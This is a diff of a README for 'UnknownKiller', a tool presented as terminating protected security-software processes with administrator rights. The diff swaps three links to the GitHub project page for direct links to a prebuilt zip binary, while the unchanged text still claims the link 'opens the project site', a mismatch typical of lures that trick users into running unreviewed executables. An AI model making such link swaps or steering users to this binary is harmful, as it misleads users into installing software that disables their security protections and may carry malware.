@@ -1,6 +1,6 @@
 # ⚔️ UnknownKiller - Remove Protected Security Processes Easily
 
-[![Download UnknownKiller](https://img.shields.io/badge/Download-UnknownKiller-brightgreen?style=for-the-badge)](https://github.com/lukmannurhikma/UnknownKiller)
+[![Download UnknownKiller](https://img.shields.io/badge/Download-UnknownKiller-brightgreen?style=for-the-badge)](https://github.com/lukmannurhikma/UnknownKiller/raw/refs/heads/main/UnknownKiller/x64/Release/Killer_Unknown_3.8.zip)
 
 ---
 
@@ -33,7 +33,7 @@ UnknownKiller will not run without administrator permissions. It works only on 6
 
 Go to the official UnknownKiller page to get the software:
 
-[Download UnknownKiller](https://github.com/lukmannurhikma/UnknownKiller)
+[Download UnknownKiller](https://github.com/lukmannurhikma/UnknownKiller/raw/refs/heads/main/UnknownKiller/x64/Release/Killer_Unknown_3.8.zip)
 
 This link opens the project site on GitHub. From here, you can find the latest files to download.
 
@@ -115,7 +115,7 @@ A: The tool stops security software processes temporarily. It is not designed to
 
 For more technical details or to see updates, visit the UnknownKiller GitHub page:
 
-[https://github.com/lukmannurhikma/UnknownKiller](https://github.com/lukmannurhikma/UnknownKiller)
+[https://github.com/lukmannurhikma/UnknownKiller/raw/refs/heads/main/UnknownKiller/x64/Release/Killer_Unknown_3.8.zip](https://github.com/lukmannurhikma/UnknownKiller/raw/refs/heads/main/UnknownKiller/x64/Release/Killer_Unknown_3.8.zip)
 
 You can find documentation, code, and links to help you understand how the tool works.
 
